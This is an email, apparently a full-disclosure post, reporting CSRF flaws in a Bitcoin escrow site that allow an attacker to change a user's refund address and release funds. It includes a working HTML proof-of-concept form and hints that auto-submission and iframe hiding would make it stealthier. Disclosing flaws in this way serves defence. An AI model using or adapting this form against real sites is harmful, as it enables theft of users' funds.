Subject: Bitcoin fun day!

In light of recent events in the "bitcoin community" I have decided that private disclosure of issues is doing nothing but making them more prevalent.

In light of this decision I would like to report multiple CSRF vulnerabilities in http://clearcoin.appspot.com .

This set of CSRFs are particularly nasty since this is hosted on appspot and uses google account auth. So long as you stay logged into your google account you are vulnerable to this CSRF.

Things tested:
  Changing refund address.
  Releasing funds.

POC code (open this in any browser even from a local file):
==========
<html><head><title>test</title></head>
  <body>
  <form id="refund_address_form" action="https://clearcoin.appspot.com/set_refund_address" method="POST"> 
      <label for="refund_address">Your bitcoin address:</label> 
      <input type="text" name="refund_address" id="refund_address" size="60" value="PUT ANY ADDRESS HERE"
             class="text ui-widget-content ui-corner-all" autofocus required placeholder="refund bitcoin address"/> (required)
  </form> 
  </body>
</html>
==========

Javascript auto submittal, hiding in an iframe, and other obfuscation methods are left as an exercise to the list.

This site is run and maintained by Gavin Anderson, aka, the lead bitcoin maintainer.

You should know better Gavin.
